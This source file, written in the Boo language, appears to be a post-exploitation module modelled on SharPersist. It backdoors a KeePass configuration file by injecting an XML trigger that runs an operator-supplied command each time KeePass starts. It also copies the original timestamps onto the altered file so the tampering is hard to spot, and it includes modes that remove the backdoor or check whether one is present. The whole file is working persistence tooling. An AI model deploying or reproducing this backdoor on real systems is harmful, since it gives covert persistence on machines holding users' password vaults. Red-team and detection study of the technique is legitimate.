/*
    This module is inspired from SharPersist (https://github.com/fireeye/SharPersist)
*/
import System
import System.IO
import System.Security.Cryptography
import System.Diagnostics


public static def SHA256CheckSum(filePath as string) as string:
    using stream = File.OpenRead(filePath):
        sha as SHA256Managed = SHA256Managed()
        hash as (byte) = sha.ComputeHash(stream)
        return BitConverter.ToString(hash).Replace("-", String.Empty)


public def initialize(command as string, commandArg as string, filePath as string, status as string):
    if (status == "add"):
        if (not command or not filePath):
            print "\r\n[-] ERROR: Must give both a command and a file path to KeePass config file."
            return
        addPersistence(command, commandArg, filePath)

    elif (status == "remove"):
        if not filePath:
            print "\r\n[-] ERROR: Must give file path of KeePass config to restore."
            return
        removePersistence(filePath)

    elif status == "check":
        checkPersistence(command, commandArg, filePath)

    else:
        print "\r\n[-] ERROR: Invalid method given. Must give add, remove or check."
        return


public def addPersistence(command as string, commandArg as string, filePath as string):
    print "\r\n[*] INFO: Adding keepass backdoor persistence"
    print "[*] INFO: Command: " + command
    print "[*] INFO: Command Args: " + commandArg
    print "[*] INFO: File Path: " + filePath

    procs as (Process) = Process.GetProcesses()
    keepassRunning as bool = false
    for proc as Process in procs:
        if (proc.ProcessName.ToLower().Contains("keepass")):
            keepassRunning = true

    if (not keepassRunning):
        contents as string = File.ReadAllText(filePath) // get contents of file given

        // only proceed if it is indeed a keepass config
        if (contents.Contains("TriggerSystem")):
            try:
                // get current file attributes
                creationTime as DateTime = File.GetCreationTime(filePath)
                lastAccessTime as DateTime = File.GetLastAccessTime(filePath)
                lastWriteTime as DateTime = File.GetLastWriteTime(filePath)

                File.Copy(filePath, filePath + ".bak") // copy the original KeePass file as a backup file

                // set file attributes for the backup file to match the original
                File.SetCreationTime(filePath + ".bak", creationTime)
                File.SetLastAccessTime(filePath + ".bak", lastAccessTime)
                File.SetLastWriteTime(filePath + ".bak", lastWriteTime)

                // string to hold the backdoored command needing to be written
                backdooredContent as String = Environment.NewLine + "    <Triggers>"
                backdooredContent += Environment.NewLine + "    <Trigger>"
                backdooredContent += Environment.NewLine + "        <Guid>Z26+bdu9zUO8LXO0Gcw1Gw==</Guid>"
                backdooredContent += Environment.NewLine + "        <Name>Debug</Name>"
                backdooredContent += Environment.NewLine + "        <Events>"
                backdooredContent += Environment.NewLine + "            <Event>"
                backdooredContent += Environment.NewLine + "                <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>"
                backdooredContent += Environment.NewLine + "                   <Parameters>"
                backdooredContent += Environment.NewLine + "                       <Parameter>0</Parameter>"
                backdooredContent += Environment.NewLine + "                       <Parameter/>"
                backdooredContent += Environment.NewLine + "                   </Parameters>"
                backdooredContent += Environment.NewLine + "               </Event>"
                backdooredContent += Environment.NewLine + "           </Events>"
                backdooredContent += Environment.NewLine + "           <Conditions/>"
                backdooredContent += Environment.NewLine + "           <Actions>"
                backdooredContent += Environment.NewLine + "               <Action>"
                backdooredContent += Environment.NewLine + "                   <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>"
                backdooredContent += Environment.NewLine + "                      <Parameters>"
                backdooredContent += Environment.NewLine + "                             <Parameter>" + command + "</Parameter>"
                backdooredContent += Environment.NewLine + "                                <Parameter>" + commandArg + "</Parameter>"
                backdooredContent += Environment.NewLine + "                                   <Parameter>False</Parameter>"
                backdooredContent += Environment.NewLine + "                                   <Parameter>1</Parameter>"
                backdooredContent += Environment.NewLine + "                                   <Parameter/>"
                backdooredContent += Environment.NewLine + "                               </Parameters>"
                backdooredContent += Environment.NewLine + "                           </Action>"
                backdooredContent += Environment.NewLine + "                       </Actions>"
                backdooredContent += Environment.NewLine + "                   </Trigger>"
                backdooredContent += Environment.NewLine + "                   </Triggers>"


                // open KeePass file to be modified and save contents in a string
                fileContents as string = File.ReadAllText(filePath)

                // replace appropriate strings with backdoored content
                fileContents = fileContents.Replace("<Triggers />", backdooredContent)

                // write to the modified and backdoored KeePass file
                File.WriteAllText(filePath, fileContents)

                // set file attributes for the backdoored KeePass config file to match what it originally was
                File.SetCreationTime(filePath, creationTime)
                File.SetLastAccessTime(filePath, lastAccessTime)
                File.SetLastWriteTime(filePath, lastWriteTime)
            except ex:
                print "\r\n[-] ERROR: Keepass configuration file not found. Ensure you have correct path and that user is using KeePass."
                return

            print "\r\n[+] SUCCESS: Keepass persistence backdoor added"
            print "[*] INFO: Location of original KeePass config file: " + filePath + ".bak"
            print "[*] INFO: Location of backdoored KeePass config file: " + filePath
            print "[*] INFO: SHA256 Hash of original KeePass config file: " + SHA256CheckSum(filePath + ".bak")
            print "[*] INFO: SHA256 Hash of backdoored KeePass config file: " + SHA256CheckSum(filePath)

        // if file is not a keepass config
        else:
            print "[-] ERROR: This is NOT a KeePass config file"

    // if keepass is running, then display message
    else:
        print "\r\n[-] ERROR: KeePass is currently running. KeePass cannot be running in order to backdoor config file."
        return


public def removePersistence(filePath as string):
    print "\r\n[*] INFO: Removing keepass backdoor persistence"
    print "[*] INFO: File Path: " + filePath

    // check to make sure that KeePass process is not running
    procs as (Process) = Process.GetProcesses()
    keepassRunning as bool = false
    for proc as Process in procs:
        if (proc.ProcessName.ToLower().Contains("keepass")):
            keepassRunning = true

    // only remove persistence trigger if keepass is not running
    if (not keepassRunning):
        // remove only if the keepass file was backdoored
        if (File.Exists(filePath + ".bak")):
            try:
                // get current file attributes of backup file
                creationTime as DateTime = File.GetCreationTime(filePath + ".bak")
                lastAccessTime as DateTime = File.GetLastAccessTime(filePath + ".bak")
                lastWriteTime as DateTime = File.GetLastWriteTime(filePath + ".bak")

                File.Delete(filePath) // delete the current backdoored KeePass file
                File.Move(filePath + ".bak", filePath) // move the backup file (pre-backdoor) to the active file now

                // set file attributes for the restored KeePass config file to match what it originally was
                File.SetCreationTime(filePath, creationTime)
                File.SetLastAccessTime(filePath, lastAccessTime)
                File.SetLastWriteTime(filePath, lastWriteTime)
            except ex:
                print "\r\n[-] ERROR: Keepass configuration file not found. Ensure you have correct path and that user is using KeePass."
                return

            print "\r\n[+] SUCCESS: Keepass persistence backdoor removed"

        // if KeePass config file not found
        else:
            print "\r\n[-] ERROR: Keepass configuration file was not found. Ensure you have correct path and that user is using KeePass."

    // if keepass is running, indicate message and return
    else:
        print "\r\n[-] ERROR: KeePass is currently running. KeePass cannot be running in order to backdoor config file."
        return


// check for persistence technique
public def checkPersistence(command as string, commandArg as string, filePath as string):
    print "\r\n[*] INFO: Checking if file given exists"

    // check to make sure the keepass config file exists
    if (File.Exists(filePath)):
        print "[+] SUCCESS: KeePass config file given exists"
        print "\r\n[*] INFO: Checking to make sure file is a KeePass config"

        // read contents of config. if it has the run system command action GUID, then it is already backdoored
        contents as string = File.ReadAllText(filePath)
        if (contents.Contains("TriggerSystem")):
            print "[+] SUCCESS: This is KeePass config file"
            print "\r\n[*] INFO: Checking backdoor present in KeePass config file"

            if (contents.Contains("2uX4OwcwTBOe7y66y27kxw==")):
                print "[-] ERROR: KeePass config file is backdoored already"
            else:
                print "[+] SUCCESS: KeePass config file is NOT backdoored"
        else:
            print "[-] ERROR: This is NOT a KeePass config file"

    // if keepass config file does not exist, display message
    else:
        print "[-] ERROR: KeePass config file given does NOT exist"

    print "\r\n[*] INFO: Checking if KeePass process is running"

    // check to make sure that KeePass process is not running
    procs as (Process) = Process.GetProcesses()
    keepassRunning as bool = false
    for proc as Process in procs:
        if (proc.ProcessName.ToLower().Contains("keepass")):
            keepassRunning = true

    if (keepassRunning):
        print "[-] ERROR: KeePass is currently running. KeePass cannot be running in order to backdoor config file."
    else:
        print "[+] SUCCESS: KeePass is not currently running."

    print "\r\n[*] INFO: Checking for correct arguments given"

    // make sure that command and file path are given
    if (not command or not filePath):
        print "[-] ERROR: Must give both a command and a file path to KeePass config file."
        return

    print "[+] SUCCESS: Correct arguments given"


public static def Main():
    command = "COMMAND"
    commandArg = "ARGUMENTS"
    filePath = `FILEPATH`
    status = "STATUS"

    initialize(command, commandArg, filePath, status)
